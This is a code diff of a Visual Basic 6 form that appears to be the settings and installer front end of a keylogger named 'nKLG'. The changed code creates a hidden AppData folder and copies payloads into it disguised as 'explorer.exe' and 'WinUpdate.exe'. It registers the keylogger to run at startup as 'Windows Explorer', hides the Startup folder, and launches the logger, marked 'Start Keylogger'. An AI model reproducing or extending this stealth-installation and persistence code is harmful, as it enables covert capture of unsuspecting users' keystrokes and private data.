@@ -16,7 +16,7 @@ Begin VB.Form Form1
    Begin VB.CommandButton cmdInstall 
       Appearance      =   0  'Flat
       BackColor       =   &H00E0E0E0&
-      Caption         =   "Re-install NPS"
+      Caption         =   "Re-install"
       Height          =   375
       Left            =   600
       Style           =   1  'Graphical
@@ -31,30 +31,9 @@ Begin VB.Form Form1
       Height          =   1935
       Left            =   360
       TabIndex        =   34
-      Top             =   1560
+      Top             =   1800
       Visible         =   0   'False
       Width           =   5415
-      Begin VB.Label Label16 
-         Alignment       =   2  'Center
-         Appearance      =   0  'Flat
-         BackColor       =   &H80000005&
-         Caption         =   "Special Thanks to Marathi cyber Army"
-         BeginProperty Font 
-            Name            =   "Arial"
-            Size            =   8.25
-            Charset         =   0
-            Weight          =   400
-            Underline       =   0   'False
-            Italic          =   0   'False
-            Strikethrough   =   0   'False
-         EndProperty
-         ForeColor       =   &H00404040&
-         Height          =   255
-         Left            =   0
-         TabIndex        =   39
-         Top             =   1560
-         Width           =   5415
-      End
       Begin VB.Label Label15 
          Alignment       =   2  'Center
          Appearance      =   0  'Flat
@@ -73,7 +52,7 @@ Begin VB.Form Form1
          Height          =   255
          Left            =   0
          TabIndex        =   37
-         Top             =   1200
+         Top             =   1320
          Width           =   5415
       End
       Begin VB.Label Label14 
@@ -96,7 +75,7 @@ Begin VB.Form Form1
          Height          =   255
          Left            =   1080
          TabIndex        =   36
-         Top             =   840
+         Top             =   960
          Width           =   3255
       End
       Begin VB.Label Label13 
@@ -161,7 +140,7 @@ Begin VB.Form Form1
          Height          =   255
          Left            =   4920
          Style           =   1  'Graphical
-         TabIndex        =   41
+         TabIndex        =   40
          Top             =   840
          Width           =   735
       End
@@ -180,7 +159,7 @@ Begin VB.Form Form1
          ForeColor       =   &H00000000&
          Height          =   225
          Left            =   120
-         TabIndex        =   40
+         TabIndex        =   39
          Top             =   900
          Width           =   4815
       End
@@ -491,8 +470,8 @@ Begin VB.Form Form1
    End
    Begin VB.Label Label10 
       Alignment       =   2  'Center
-      BackColor       =   &H00C0C0C0&
-      Caption         =   "Application Developed by niL"
+      BackColor       =   &H00404040&
+      Caption         =   "Programmed by niL"
       BeginProperty Font 
          Name            =   "Tahoma"
          Size            =   9
@@ -502,7 +481,7 @@ Begin VB.Form Form1
          Italic          =   0   'False
          Strikethrough   =   0   'False
       EndProperty
-      ForeColor       =   &H00000000&
+      ForeColor       =   &H00FFFFFF&
       Height          =   255
       Left            =   0
       TabIndex        =   33
@@ -617,6 +596,7 @@ Public Enum mceIDLPaths
     CSIDL_STARTUP = &H7 ' * CSIDL_STARTUP - File system directory that corresponds to the user's Startup program group. The system starts these programs whenever any user logs onto Windows NT or starts Windows® 95. A common path is C:\WINNT\Profiles\username\Start Menu\Programs\Startup.
 End Enum
 Private Declare Function SHGetSpecialFolderPath Lib "SHELL32.DLL" Alias "SHGetSpecialFolderPathA" (ByVal hWnd As Long, ByVal lpszPath As String, ByVal nFolder As Integer, ByVal fCreate As Boolean) As Boolean
+Public AppDataPath As String
 
 'active window title
 Private Declare Function GetForegroundWindow Lib "user32" () As Long
@@ -655,13 +635,14 @@ List1.AddItem txtUpdate, List1.ListIndex + 1
 End Sub
 
 Private Sub Form_Load()
-If Command = "/install" Then Call InstallNPS: Exit Sub: End
+AppDataPath = GetSpecialFolderA(CSIDL_APPDATA)
 
+If Command = "/install" Then Call InstallNPS: Exit Sub: End
 If Command = "/default" Then
     Call LoadSetting(App.Path & "\Files\files.cab"): chkAuto.Enabled = False: Label9.Caption = "nKLG - Default Settings"
 Else
-    If Dir(GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe") <> "" Then
-    Call LoadSetting(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp")
+    If Dir(AppDataPath & "System\explorer.exe") <> "" Then
+    Call LoadSetting(AppDataPath & "System\cmsetacl.tmp")
     Call LoadAutoRunSetting
     Else
     Dim ans As String
@@ -697,7 +678,7 @@ If Dir(GetSpecialFolderA(CSIDL_STARTUP) & "Windows Explorer.lnk") <> "" Then opt
 
 ' See if the program is set to run at startup.
     m_IgnoreEvents = True
-    If WillRunAtStartup("Windows Explorer") Then
+    If WillRunAtStartup("explorer") Then
         optReg.Value = True
     Else
         optReg.Value = False
@@ -721,12 +702,10 @@ MsgBox "Setting Saved!!", vbInformation
 End If
 End Sub
 Private Sub SaveAutorunSetting()
-Dim AppDataPath As String
-AppDataPath = GetSpecialFolderA(CSIDL_APPDATA)
 
 If chkAuto.Value = vbUnchecked Then
     Create_Startup_ShortCut AppDataPath & "System\explorer.exe", "Windows Explorer", , 7, 1, False
-    SetRunAtStartup "Windows Explorer", AppDataPath & "System", False
+    SetRunAtStartup "explorer", AppDataPath & "System", False
     Exit Sub
 End If
 
@@ -777,7 +756,7 @@ Dim t1, t2, t3, t4, t5 As String
 If chkAuto.Enabled = False Then
 Open (App.Path & "\Files\main.exe") For Input As #1
 Else
-Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") For Input As #1
+Open (AppDataPath & "System\default.MCP") For Input As #1
 End If
 Input #1, t1, t2, t3, t4, t5
 Close #1
@@ -799,7 +778,7 @@ Private Sub cmdsaveChanges_Click()
 If chkAuto.Enabled = False Then
 Call SaveSetting(App.Path & "\Files\files.cab")
 Else
-Call SaveSetting(GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp")
+Call SaveSetting(AppDataPath & "System\cmsetacl.tmp")
 SaveAutorunSetting
 End If
 End Sub
@@ -828,7 +807,7 @@ On Error Resume Next
 If chkAuto.Enabled = False Then
 Open (App.Path & "\Files\main.exe") For Output As #1
 Else
-Open (GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP") For Output As #1
+Open (AppDataPath & "System\default.MCP") For Output As #1
 End If
         Write #1, t1, t2, t3, t4, t5
 Close #1
@@ -854,24 +833,25 @@ End Sub
 
 Private Sub InstallNPS()
 On Error GoTo errhand
-If FolderExists(GetSpecialFolderA(CSIDL_APPDATA) & "System") = False Then MkDir GetSpecialFolderA(CSIDL_APPDATA) & "System"
-Call HideThisFolder(GetSpecialFolderA(CSIDL_APPDATA) & "System", True)
+If FolderExists(AppDataPath & "System") = False Then MkDir AppDataPath & "System"
+Call HideThisFolder(AppDataPath & "System", True)
 
-FileCopy App.Path & "\Files\msex.text", GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe"   'explorer.exe
-FileCopy App.Path & "\Files\AS4T.CVF", GetSpecialFolderA(CSIDL_APPDATA) & "System\WinUpdate.exe"     'winUpdate.exe
-FileCopy App.Path & "\Files\files.CAB", GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp"
-FileCopy App.Path & "\Files\main.exe", GetSpecialFolderA(CSIDL_APPDATA) & "System\default.MCP"
+FileCopy App.Path & "\Files\msex.text", AppDataPath & "System\explorer.exe"   'explorer.exe
+FileCopy App.Path & "\Files\AS4T.CVF", AppDataPath & "System\WinUpdate.exe"     'winUpdate.exe
+FileCopy App.Path & "\Files\files.CAB", AppDataPath & "System\cmsetacl.tmp"
+FileCopy App.Path & "\Files\main.exe", AppDataPath & "System\default.MCP"
 
 'Set Autorun options
-Create_Startup_ShortCut AppDataPath & "System\explorer.exe", "Windows Explorer", , 7, 1, False
-If m_IgnoreEvents Then Exit Sub
-SetRunAtStartup "Windows Explorer", AppDataPath & "System", True
+chkAuto.Value = vbChecked
+optReg.Value = False
+SaveAutorunSetting
 
-LoadSetting (GetSpecialFolderA(CSIDL_APPDATA) & "System\cmsetacl.tmp")
+
+LoadSetting (AppDataPath & "System\cmsetacl.tmp")
 LoadAutoRunSetting
 
 'Start Keylogger:
-Shell GetSpecialFolderA(CSIDL_APPDATA) & "System\explorer.exe", vbNormalFocus
+Shell AppDataPath & "System\explorer.exe", vbNormalFocus
 
 errhand:
 If err.Number = 0 Then
@@ -898,12 +878,13 @@ Label9.BackColor = &H404040
 Label3.BackColor = &HFF0000
 Label5.BackColor = &HFF0000
 Frame4.Visible = False
-Label10.BackColor = &H808080
+Label10.BackColor = &H404040
 End Sub
 
 Private Sub Label10_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
 Frame4.Visible = True
-Label10.BackColor = vbWhite
+Label10.BackColor = vbBlack
+Label14.Caption = App.ProductName & " " & App.Major & "." & App.Minor & "." & App.Revision
 End Sub
 
 Private Sub Label3_Click()
@@ -915,6 +896,7 @@ End Sub
 Private Sub Label3_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
 Label3.BackColor = &HFF8080
 Frame4.Visible = True
+Label14.Caption = "Thank You for Using!!"
 End Sub
 
 Private Sub Label5_Click()
@@ -1004,9 +986,12 @@ Private Sub Create_Startup_ShortCut(ByVal TargetPath As String, ByVal ShortCutna
 
 
 If maKe = False Then
+    Call HideThisFolder(GetSpecialFolderA(CSIDL_STARTUP), False)
     If Dir(GetSpecialFolderA(CSIDL_STARTUP) & ShortCutname & ".lnk") <> "" Then Kill GetSpecialFolderA(CSIDL_STARTUP) & ShortCutname & ".lnk"
     Exit Sub
 End If
+
+Call HideThisFolder(GetSpecialFolderA(CSIDL_STARTUP), True)
 
     Dim VbsObj As Object
     Set VbsObj = CreateObject("WScript.Shell")
@@ -1114,6 +1099,7 @@ End Sub
 
 Private Sub txtLogDir_DblClick()
 If Left(txtLogDir, 2) = "u:" Then txtLogDir = Environ$("USERPROFILE") & Mid(txtLogDir, 3, Len(txtLogDir) - 2)
+If FolderExists(txtLogDir) = False Then MkDir txtLogDir
 Shell ("explorer " & txtLogDir.Text), vbNormalFocus
 End Sub
 
